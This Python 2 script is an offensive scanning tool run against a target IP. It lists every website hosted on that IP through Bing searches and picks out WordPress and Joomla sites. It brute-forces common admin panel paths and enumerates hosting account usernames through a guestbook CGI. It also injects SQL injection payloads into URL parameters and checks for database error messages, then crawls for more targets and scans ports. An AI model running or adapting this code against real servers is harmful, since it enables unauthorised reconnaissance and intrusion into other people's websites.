#!/usr/bin/python2
# -*- coding: utf-8 -*-


class Collors():
    rs = '\033[31m'

import re, urllib2, urllib, os, socket, sys
from platform import system


banner = Collors.rs + """
\t╔═╗┬─┐┌─┐┬ ┬┬     ┬   ╔═╗┌┬┐┬ ┬┌─┐┬─┐┌─┐
\t║  ├┬┘├─┤││││    ┌┼─  ║ ║ │ ├─┤├┤ ├┬┘└─┐
\t╚═╝┴└─┴ ┴└┴┘┴─┘  └┘   ╚═╝ ┴ ┴ ┴└─┘┴└─└─┘                               
"""

menu = Collors.rs + ''' 
 1) All websites                 7) Crawl and scan from SQL injection
 2) Joomla websites              8) Scan ports (range of ports)
 3) Wordpress websites           9) Scan ports (common ports )
 4) Control panel               10) Server banner
 5) Server users                
 6) Scan from SQL injection      0) Exit

'''
def unique(seq):
	seen = set()
	return [seen.add(x) or x for x in seq if x not in seen]
	
def clear() :
	os.system('clear')

class Scan :
	def __init__(self, serverip) :
		self.serverip = serverip
		self.getSites(False)
		print menu
		while True :
			choice = raw_input(' Choice : ')
			if choice == '1' :
				self.getSites(True)
			elif choice == '2' :
				self.getJoomla()
			elif choice == '3' :
				self.getWordpress()
			elif choice == '4' :
				self.findPanels()
			elif choice == '5' :
				self.getUsers()
			elif choice == '6' :
				self.grabSqli()
			elif choice == '7' :
				nbpages = int(raw_input(' Number of pages to crawl: '))
				self.crawlSqli(nbpages)
			elif choice == '8' :
				ran = raw_input(' Enter range of ports: ')
				self.portScanner(1, ran)
			elif choice == '9' :
				self.portScanner(2, None)
			elif choice == '10' :
				self.getServerBanner()
			elif choice == '0' :
				exit()
			con = raw_input(' Continue [Y/n]  ')
			if con[0].upper() == 'N' :
				exit()
			else :
				clear()
				print banner
				print menu
	def getSites(self, a) :
		lister = []
		page = 1
		while page <= 101:
			try:
				bing = "http://www.bing.com/search?q=ip%3A" + self.serverip + "+&count=50&first=" + str(page)
				openbing = urllib2.urlopen(bing)
				readbing = openbing.read()
				findwebs = re.findall('<h2><a href="(.*?)"', readbing)
				for i in range(len(findwebs)):
					allnoclean = findwebs[i]
					findall1 = re.findall('http://(.*?)/', allnoclean)
					for idx, item in enumerate(findall1):
						if 'www' not in item:
							findall1[idx] = 'http://www.' + item + '/'
						else:
							findall1[idx] = 'http://' + item + '/'
					lister.extend(findall1)
					
				page += 50
			except urllib2.URLError:
				pass
		self.sites = unique(lister)
		if a :		
			clear()
			print '[*] Found ', len(lister), ' Website\n'
			for site in self.sites :
				print site
			
	def getWordpress(self) :
		lister = []
		page = 1
		while page <= 101:
			try:
				bing = "http://www.bing.com/search?q=ip%3A" + self.serverip + "+?page_id=&count=50&first=" + str(page)
				openbing = urllib2.urlopen(bing)
				readbing = openbing.read()
				findwebs = re.findall('<h2><a href="(.*?)"', readbing)
				for i in range(len(findwebs)):
					wpnoclean = findwebs[i]
					findwp = re.findall('(.*?)\?page_id=', wpnoclean)
					lister.extend(findwp)
				page += 50
			except:
				pass
		lister = unique(lister)
		clear()
		print '[+] Found', len(lister), ' Wordpress Website\n'
		for site in lister :
			print site
	def getJoomla(self) :
		lister = []
		page = 1
		while page <= 101:
			bing = "http://www.bing.com/search?q=ip%3A" + self.serverip + "+index.php?option=com&count=50&first=" + str(page)
			openbing = urllib2.urlopen(bing)
			readbing = openbing.read()
			findwebs = re.findall('<h2><a href="(.*?)"', readbing)
			for i in range(len(findwebs)):
				jmnoclean = findwebs[i]
				findjm = re.findall('(.*?)index.php', jmnoclean)
				lister.extend(findjm)
			page += 50
		lister = unique(lister)
		clear()
		print '[*] Found ', len(lister), ' Joomla Website\n'
		for site in lister:
			print site		
	def findPanels(self) :
		print "[~] Amin panels"
		adminList = ['admin/', 'site/admin', 'admin.php/', 'up/admin/', 'central/admin/', 'whm/admin/', 'whmcs/admin/', 'support/admin/', 'upload/admin/', 'video/admin/', 'shop/admin/', 'shoping/admin/', 'wp-admin/', 'wp/wp-admin/', 'blog/wp-admin/', 'admincp/', 'admincp.php/', 'vb/admincp/', 'forum/admincp/', 'up/admincp/', 'administrator/', 'administrator.php/', 'joomla/administrator/', 'jm/administrator/', 'site/administrator/', 'install/', 'vb/install/', 'dimcp/', 'clientes/', 'admin_cp/', 'login/', 'login.php', 'site/login', 'site/login.php', 'up/login/', 'up/login.php', 'cp.php', 'up/cp', 'cp', 'master', 'adm', 'member', 'control', 'webmaster', 'myadmin', 'admin_cp', 'admin_site']
		clear()
		for site in self.sites :
			for admin in adminList :
				try :
					if urllib.urlopen(site + admin).getcode() == 200 :
						print " [*] Found admin panel -> ", site + admin
				except IOError :
					pass
					
	def getUsers(self) :
		clear()
		print "[~] Grabbing Users"
		userslist = []
		for site1 in self.sites :
			try:
				site = site1
				site = site.replace('http://www.', '')
				site = site.replace('http://', '')
				site = site.replace('.', '')
				if '-' in site:
					site = site.replace('-', '')
				site = site.replace('/', '')
				while len(site) > 2:
					resp = urllib2.urlopen(site1 + '/cgi-sys/guestbook.cgi?user=%s' % site).read()
					if 'invalid username' not in resp.lower():
						print '\t [*] Found -> ', site
						userslist.append(site)
						break
					else :
						print site
						
					site = site[:-1]
			except:
				pass
					
		clear()
		for user in userslist :
			print user
						
	def getServerBanner(self) :
		clear()
		try:
			s = 'http://' + self.serverip
			httpresponse = urllib.urlopen(s)
			print ' [*] Server header -> ', httpresponse.headers.getheader('server')
		except:
			pass
			
	def grabSqli(self) :
		page = 1
		lister = []
		while page <= 101:
			try:
				bing = "http://www.bing.com/search?q=ip%3A" + self.serverip + "+php?id=&count=50&first=" + str(page)
				openbing = urllib2.urlopen(bing)
				readbing = openbing.read()
				findwebs = re.findall('<h2><a href="(.*?)"', readbing)
				for i in range(len(findwebs)):
					x = findwebs[i]
					lister.append(x)
			except:
				pass			
			page += 50	
		lister = unique(lister)		
		self.checkSqli(lister)
		
	def checkSqli(self, s):
		clear()
		print "[~] Checking SQL injection"
		payloads = ["3'", "3%5c", "3%27%22%28%29", "3'><", "3%22%5C%27%5C%22%29%3B%7C%5D%2A%7B%250d%250a%3C%2500%3E%25bf%2527%27"]
		check = re.compile("Incorrect syntax|mysql_fetch|Syntax error|Unclosed.+mark|unterminated.+qoute|SQL.+Server|Microsoft.+Database|Fatal.+error", re.I)
		for url in s:
			try:
				for param in url.split('?')[1].split('&'):
					for payload in payloads:
						power = url.replace(param, param + payload.strip())
						html = urllib2.urlopen(power).readlines()
						for line in html:
							checker = re.findall(check, line)
							if len(checker) != 0 :
								print ' [*] SQLi found -> ', power
			except:
				pass
	
	def crawlSqli(self, nbpages) :
		import chilkat
		spider = chilkat.CkSpider()
		for url in self.sites :
			spidred = []
			print " [~] Crawling -> ", url
			spider.Initialize(url)
			i = 0
			for i in range(nbpages) :
				if spider.CrawlNext() :
					spidred.append(spider.lastUrl())
			print " [+] Crawled -> ", spidred
			print " [~] Scanning -> ", url, " from SQL injection"
			self.checkSqli(spidred)
			
	def portScanner(self, mode, ran) :
		clear()
		print "[~] Scanning Ports"
		def do_it(ip, port):
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock = sock.connect_ex((ip,port))
			if sock == 0:
				print " [*] Port %i is open" % port 		
		if mode == 1 :
			a = ran.split('-')
			start = int(a[0])
			end = int(a[1])
			for i in range(start, end):
				do_it(self.serverip, i)
		elif mode == 2 :
			for port in [80,21,22,2082,25,53,110,443,143] :
				do_it(self.serverip, port)

if __name__ == '__main__' :
	try :
		clear()
		print banner
		Scan(sys.argv[1])
	except IndexError :
		print " [*] Usage : python "+sys.argv[0]+" <ip>"
